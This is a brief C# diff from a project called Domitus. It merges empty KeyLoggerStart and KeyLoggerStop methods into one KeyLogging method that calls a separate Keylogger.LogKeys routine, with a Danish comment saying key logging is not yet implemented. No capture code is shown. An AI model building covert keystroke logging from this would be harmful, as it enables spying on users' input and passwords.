@@ -58,13 +58,9 @@ namespace Domitus
 
         }
 
-        public void KeyLoggerStart()
+        public void KeyLogging() //Ikke implementeret en måde at logge keys på
         {
-
-        }
-        public void KeyLoggerStop()
-        {
-
+            DomitusJM.Actions.Keylogger.LogKeys();
         }
     }
 }
